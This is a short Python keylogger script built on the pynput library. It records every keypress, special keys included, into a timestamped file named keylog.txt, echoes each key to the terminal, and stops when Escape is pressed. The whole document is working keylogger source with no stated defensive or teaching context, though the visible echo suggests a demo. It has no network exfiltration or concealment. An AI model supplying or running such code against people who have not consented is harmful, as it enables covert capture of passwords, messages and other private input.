import logging
import sys

try:
    import importlib.util
    if importlib.util.find_spec("pynput") is None:
        raise ImportError
    from pynput import keyboard
except ImportError:
    print("Error: The 'pynput' module is not installed or supported in this environment.")
    sys.exit(1)

# Set up logging to store keystrokes in a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            print(f'Key Pressed: {key.char}')  # Show key pressed in terminal
            logging.info(f'Key Pressed: {key.char}')
        else:
            print(f'Special Key Pressed: {key}')  # Show special keys in terminal
            logging.info(f'Special Key Pressed: {key}')
    except Exception as e:
        logging.error(f'Error: {e}')

def on_release(key):
    if key == keyboard.Key.esc:  # Stop logging when 'Escape' is pressed
        return False

# Start listening for key presses
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    logging.error(f'Listener Error: {e}')
    print("An error occurred while starting the keylogger. Check keylog.txt for details.")
